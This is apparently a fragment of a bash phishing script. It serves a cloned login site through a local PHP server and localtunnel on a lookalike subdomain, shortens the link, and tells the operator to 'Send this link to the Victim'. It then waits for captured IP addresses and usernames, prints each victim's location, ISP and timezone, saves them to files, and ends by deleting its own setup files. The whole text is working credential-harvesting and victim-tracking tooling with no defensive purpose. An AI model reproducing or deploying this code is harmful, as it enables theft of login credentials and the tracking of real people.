printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Location:\e[0m\e[1;77m %s\e[0m\n" $loc
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Maps:\e[0m\e[1;77m %s\e[0m\n" $gm
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" $org
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Timezone:\e[0m\e[1;77m %s\e[0m\n" $tz
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt




getcredentials
}
start() {
printf "\n"
printf "1.Localtunnel\n"
echo ""
read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose the tunneling method:]─[~]
 └──╼ ~ ' host
 
if [[ $host == 1 ]]; then
sleep 1
start_localtunnel
fi
}

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2

start_localtunnel()  {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2

printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
lt --port 5555 --subdomain wmw-$server-com > /dev/null 2>&1 &
sleep 4
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "https://wmw-"$server"-com.loca.lt"
short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt`
printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
echo ""
echo ""

checkfound
}

checkfound() {


printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip

fi
sleep 1
done 

}
rm -rf setup.sh
rm -rf tmxsp.sh
rm -rf index.html
rm -rf .gitignore
rm -rf .nojekyll
banner
menu
